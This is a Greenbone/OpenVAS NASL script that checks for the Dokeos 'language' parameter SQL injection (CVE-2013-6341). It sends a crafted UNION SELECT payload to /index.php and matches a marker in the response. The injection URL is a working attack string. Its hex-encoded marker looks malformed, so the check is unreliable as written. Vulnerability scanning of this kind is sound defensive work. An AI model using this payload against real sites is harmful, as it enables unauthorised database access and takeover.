# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:dokeos:dokeos";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903415");
  script_version("2021-08-11T10:41:15+0000");
  script_cve_id("CVE-2013-6341");
  script_bugtraq_id(63461);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2021-08-12 10:27:55 +0000 (Thu, 12 Aug 2021)");
  script_tag(name:"creation_date", value:"2013-11-28 14:52:35 +0530 (Thu, 28 Nov 2013)");
  script_name("Dokeos <= 2.2 RC2 'language' Parameter SQLi Vulnerability");

  script_tag(name:"summary", value:"Dokeos is prone to a SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"insight", value:"The flaw is due to insufficient validation of 'language' HTTP
  GET parameter passed to '/index.php' script.");

  script_tag(name:"affected", value:"Dokeos versions 2.2 RC2 and probably prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL commands in applications database and gain complete control over the vulnerable web
  application.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23181");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/dokeos-22-rc2-sql-injection");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_dokeos_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dokeos/http/detected");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

url = dir + "/index.php?language=0%27%20UNION%20SELECT%201,2,3," +
            "0x673716C2D696E6A656374696F6E2D74657374,version%28%29,6,7,8%20--%202)";

if (http_vuln_check(port: port, url: url, check_header: TRUE, pattern: "sql-injection-test",
                    extra_check:make_list("www\.dokeos\.com", "Dokeos"))) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);